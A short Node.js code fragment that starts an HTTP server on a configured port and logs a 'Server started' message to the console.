http.listen(PORT, function () {
  console.log("Server started on port " + PORT);
});
